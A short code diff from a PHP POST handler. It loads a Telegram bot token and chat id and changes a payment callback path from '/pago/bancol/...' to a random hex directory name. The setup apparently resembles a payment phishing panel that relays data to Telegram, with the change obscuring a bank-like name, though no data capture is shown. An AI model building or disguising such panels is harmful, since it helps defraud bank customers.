@@ -29,7 +29,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $bot_token = $localConfig['telegram']['bot_token'] ?? $config['botToken'];
     $chat_id = $localConfig['telegram']['chat_id'] ?? $config['chatId'];
-    $baseUrl = $localConfig['base_url'] ?? ($config['baseUrl'] . '/pago/bancol/modules/api/actualizar_estado.php');
+    $baseUrl = $localConfig['base_url'] ?? ($config['baseUrl'] . '/pago/4c7a1d9e/modules/api/actualizar_estado.php');
     $security_key = $config['security_key'];
 
     // 2. Recuperar datos
